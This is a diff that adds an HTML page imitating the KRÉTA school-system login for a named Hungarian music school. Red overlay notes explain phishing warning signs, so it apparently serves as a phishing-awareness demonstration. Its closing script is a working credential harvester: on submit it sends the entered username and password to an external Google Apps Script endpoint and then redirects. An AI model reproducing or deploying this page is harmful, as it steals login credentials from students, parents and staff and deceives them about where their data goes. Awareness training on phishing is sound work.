@@ -1,0 +1,357 @@
+<!doctype html>
+<html lang="hu">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<link rel="icon" type="image/x-icon" href="https://idp.e-kreta.hu/favicon.ico"/>
+<title>KRÉTA Bejelentkezés</title>
+<style>
+  /* Általános */
+  :root{
+    --bg:#344f55;           /* sötét háttér */
+    --card:#ffffff;
+    --brand:#2fb2c9;        /* kék fejléc */
+    --input-bg:#e9eef1;     /* világos input belső */
+    --muted:#6b6f73;
+    --link:#1a63c9;
+    --info-bg:#cfe7ff;      /* világoskék értesítő */
+    --shadow: 0 6px 12px rgba(0,0,0,0.25);
+    --radius:6px;
+  }
+  html,body{
+    height:100%;
+    margin:0;
+    font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background:var(--bg);
+    color:#222;
+  }
+
+  /* középre rendezés */
+  .wrap{
+    min-height:100%;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    padding:34px 20px 60px;
+    box-sizing:border-box;
+  }
+
+  /* logó fent középen */
+  .logo {
+    margin: 8px 0 22px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+
+  /* fehér doboz (login card) */
+  .card {
+    width: 660px;                /* a kép arányához igazítva */
+    max-width:600px;
+    background:var(--card);
+    border-radius:var(--radius);
+    box-shadow:var(--shadow);
+    overflow:hidden;
+  }
+
+  /* fő fejléc kék sáv */
+  .card .head{
+    background:var(--brand);
+    color:#fff;
+    padding:10px;
+    text-align:center;
+    font-weight:700;
+    font-size:20px;
+    line-height:1.25;
+  }
+
+  /* alatta a kisebb szöveg (azonosító, OM) */
+  .card .sub{
+    text-align:center;
+    padding:10px;
+    font-size:14px;
+    font-weight: normal;
+    line-height: 1.25;
+  }
+
+  /* form rész */
+  .card .body{
+    padding:10px;
+  }
+
+  .field{
+    position:relative;
+    margin-bottom:14px;
+  }
+
+  input[type="text"], input[type="password"]{
+    width:100%;
+    box-sizing:border-box;
+    padding:7px 46px 7px 8px; /* jobbra hely a szem-ikonnak */
+    border-radius:6px;
+    border: 1px solid #d5d9db;
+    background:var(--input-bg);
+    font-size:15px;
+    color:#2b2f31;
+    outline:none;
+    transition:box-shadow .12s, border-color .12s;
+  }
+  input::placeholder{ color:#97a0a4; }
+
+  input:focus{
+    border-color:#b8dce4;
+    box-shadow:0 0 0 3px rgba(47,178,201,0.08);
+  }
+
+  /* szem ikon a jelszómező végén */
+  .eye{
+    position:absolute;
+    right:12px;
+    top:50%;
+    transform:translateY(-50%);
+    width:28px;
+    height:28px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    cursor:pointer;
+    opacity:0.9;
+  }
+  .eye svg{ width:18px; height:18px; fill:#7c8588; }
+
+  /* link és gomb sor */
+  .row{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:12px;
+    margin-top:2px;
+  }
+
+  .left-links{
+    display:flex;
+    flex-direction:column;
+    gap:8px;
+  }
+
+  a.link{
+    color:var(--link);
+    text-decoration:underline;
+    font-size:14px;
+  }
+
+  /* bejelentkezés gomb (kis box jobbra) */
+  .btn-outer{
+    display:flex;
+    justify-content:flex-end;
+    align-items:center;
+  }
+
+  button.btn{
+    background:var(--brand);
+    border:none;
+    color:#fff;
+    padding:10px 16px;
+    border-radius:6px;
+    cursor:pointer;
+    font-size:14px;
+    box-shadow:0 2px 0 rgba(0,0,0,0.06) inset;
+  }
+  button.btn:hover{ filter:brightness(.95); }
+
+  /* értesítő doboz */
+  .info {
+    margin-top:20px;
+    width:660px;
+    max-width:600px;
+    background:var(--info-bg);
+    border-radius:var(--radius);
+    padding:10px;
+    box-sizing:border-box;
+    color:#06385f;
+    font-size:15px;
+    box-shadow:0 3px 10px rgba(0,0,0,0.12);
+  }
+  .info h3{
+    margin:0 0 8px 0;
+    text-align:center;
+    font-size:22px;
+    color:#103d6d;
+    font-weight:700;
+  }
+  .info p{ margin:0; line-height:1.6; }
+
+  /* footer */
+  .footer {
+    margin-top:18px;
+    color:#cfdcde;
+    text-align:center;
+    font-size:13px;
+    line-height:1.6;
+  }
+  .footer a{ color:#fff; text-decoration:underline; }
+
+  /* overlay réteg */
+  .overlay {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  .mark {
+    position: absolute;
+    background: rgba(255,0,0,0.85);
+    color: #fff;
+    font-size: 14px;
+    padding: 6px 10px;
+    border-radius: 6px;
+    max-width: 220px;
+    line-height: 1.4;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.5);
+  }
+
+  /* kisebb képernyőn kisebb doboz */
+  @media (max-width:720px){
+    .card, .info{ width:100%; }
+    .card .head{ font-size:18px; padding:14px 18px; }
+    input[type="text"], input[type="password"]{ padding:12px 44px 12px 12px; }
+  }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <!-- logó (egyszerűsített, hasonló megjelenésű SVG a képen láthatóhoz) -->
+    <div class="logo" aria-hidden="true">
+      <img src="https://idp.e-kreta.hu/kreta_feher.png">
+    </div>
+
+    <!-- fő fehér kártya -->
+    <div class="card" role="region" aria-label="Bejelentkezés">
+      <div class="head">
+        Kodály Zoltán Magyar Kórusiskola<br>és Alapfokú Művészeti Iskola
+        <div class="sub">
+            OM kód: 035307
+        </div>
+      </div>
+
+      <div class="body">
+        <form name="felhasznalonev-gyujtese">
+          <div class="field">
+            <input name="felhasználónév" id="user" type="text" placeholder="Felhasználónév" autocomplete="username" required />
+          </div>
+
+          <div class="field">
+            <input name="p" id="pwd" type="password" placeholder="Jelszó" autocomplete="current-password" required />
+            <div class="eye" id="toggleEye" title="Jelszó megjelenítése">
+              <!-- egyszerű szem ikon SVG -->
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M12 5c-5 0-9 4.5-10 7 1 2.5 5 7 10 7s9-4.5 10-7c-1-2.5-5-7-10-7zm0 11a4 4 0 1 1 .001-8.001A4 4 0 0 1 12 16zm0-6.5a2.5 2.5 0 1 0 .001 5.001A2.5 2.5 0 0 0 12 9.5z"/>
+              </svg>
+            </div>
+          </div>
+
+          <div class="row">
+            <div class="left-links">
+              <a href="https://klik035307001.e-kreta.hu/Adminisztracio/ElfelejtettJelszo" class="link">Elfelejtettem a jelszavam</a>
+            </div>
+
+            <div class="btn-outer">
+              <button type="submit" class="btn">BEJELENTKEZÉS</button>
+            </div>
+          </form>
+          </div>
+
+        <div style="margin-top:12px; text-align:right;">
+          <a href="https://tudasbazis.ekreta.hu/pages/viewpage.action?pageId=2425086" class="link">Nem tud bejelentkezni?</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- információs doboz -->
+    <div class="info" role="note" aria-label="Rendszerértesítés">
+      <h3>Rendszerértesítés</h3>
+      <p>
+        A KRÉTA rendszer tervezett frissítésének időpontja: <strong>2025.09.10. 22:00</strong><br>
+        Ez idő alatt a KRÉTA rendszer időszakosan nem lesz elérhető. Köszönjük türelmüket!
+      </p>
+    </div>
+
+    <!-- lábléc -->
+    <div class="footer">
+      <div><a href="https://tudasbazis.ekreta.hu/pages/viewpage.action?pageId=4064926">Adatkezelési tájékoztató</a></div>
+      <div style="opacity:0.95; margin-top:6px; font-size:12px; color:#dbe6e8;">
+        Verzió: 1.40.5 - (2025.07.30.)<br>
+        d003d764d0ee9bb71daa274d6d28627efb292a0f<br>
+        Ez egyébként egy hamis oldal, én nem írnék be semmit.<br>
+        Támogatott böngészők:<br>
+        Google Chrome, Mozilla Firefox, Opera, Microsoft Edge
+      </div>
+    </div>
+  </div>
+
+  <!-- overlay jelölések -->
+  <div class="overlay">
+    <div class="mark" style="top:1%; left:1%;">
+      ⚠ Az URL cím <i>kz<b>n</b>k.hu</i>, nem <i>kzmk.hu</i> de egyébként is a KZMK-s KRÉTA URL címe 
+      <i>kzmk.ekreta.hu</i>, ami átirányít egy <i>idp.e-kreta.hu</i> címre.
+    </div>
+
+    <div class="mark" style="top:17%; right:20%;">
+      ⚠ Az iskola hivatalos neve ennél jóval hosszabb, az igazi KRÉTA bejelentkező felületen így is jelenik meg.
+      Továbbá hiányzik a KRÉTA azonosító is.
+    </div>
+
+    <div class="mark" style="top:48%; left:42%;">
+      ⚠ A bejelentkezés gomb akkor is tovább visz, ha hibás adatokat adtál meg, hisz ellenőrizni nem tudja, csak eltárolja.
+    </div>
+
+    <div class="mark" style="bottom:7%; left:60%;">
+      ⚠ A láblécben szerepel, hogy ez egy hamis oldal.
+    </div>
+
+    <div class="mark" style="bottom:30%; left:10%;">
+      ⚠ Nem teljesen stimmelnek a stílusok és a színek sem, hasonlítsd össze az eredeti KRÉTA oldallal!
+    </div>
+  </div>
+
+  <div class="mark" style="position: absolute; bottom: 1%; right:1%; cursor: pointer;" onclick="window.location.href='./faliujsag-gyanus.html'">
+      TOVÁBB ▶
+  </div>
+  
+<script src="https://wzrd.in/standalone/formdata-polyfill"></script>
+<script src="https://wzrd.in/standalone/promise-polyfill@latest"></script>
+<script src="https://wzrd.in/standalone/whatwg-fetch@latest"></script>
+<script>
+  // szem-ikon működés: jelszó megjelenítése / elrejtése
+  (function(){
+    const eye = document.getElementById('toggleEye');
+    const pwd = document.getElementById('pwd');
+    let shown = false;
+    eye.addEventListener('click', function(e){
+      shown = !shown;
+      pwd.type = shown ? 'text' : 'password';
+      // egyszerű vizuális visszajelzés: ikon szín változtatása
+      const svg = eye.querySelector('svg');
+      if(shown){
+        svg.style.fill = '#2b8792';
+      } else {
+        svg.style.fill = '';
+      }
+    });
+  })();
+
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbzlZqcPg0w66xCpCqJ7xQ70X19u3TfmgDuTwJyGc9O7j9FK6Id9T-PhzXQX6K-INC8zDA/exec'
+  const form = document.forms['felhasznalonev-gyujtese']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+      .then(window.location.href = "./faliujsag.html")
+  })
+</script>
+</body>
+</html>
